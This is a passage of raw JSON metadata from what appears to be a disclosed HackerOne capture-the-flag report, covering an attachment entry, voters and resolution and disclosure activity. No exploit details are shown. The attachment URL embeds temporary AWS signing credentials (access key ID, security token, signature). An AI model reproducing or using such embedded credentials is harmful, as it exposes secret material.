filter-bypass.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/438/212/f1e8f56a26606bab5e2cc9ccdbf48bfa8eba483f/filter-bypass.png?response-content-disposition=attachment%3B%20filename%3D%22filter-bypass.png%22%3B%20filename%2A%3DUTF-8%27%27filter-bypass.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150744Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=366f3877071961f5d2155465506c1064fa87ca685db46df0260d613c7784c86e","file_size":482927,"type":"image/png"}],"allow_singular_disclosure_at":"2019-05-08T15:54:04.302Z","allow_singular_disclosure_after":-76634020.6371239,"singular_disclosure_allowed":true,"vote_count":11,"voters":["checkm50","mik317","ali","f_m","magic_spell","beamjack","sorted_one","flads","sinswriter","globalenigma","and 1 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4492853,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for the amazing report! We'll be announcing the winners shortly, so we'll let you know if you're one of the reports selected. Going to close this and then request public disclosure now.","automated_response":false,"created_at":"2019-04-05T18:34:57.882Z","updated_at":"2019-04-05T18:34:57.882Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"lucio","url":"/lucio"},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509074,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-04-08T15:54:04.172Z","updated_at":"2019-04-08T15:54:04.172Z","first_to_agree":true,"actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509076,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","automated_response":false,"created_at":"2019-04-08T15:54:14.960Z","updated_at":"2019-04-08T15:54:14.960Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}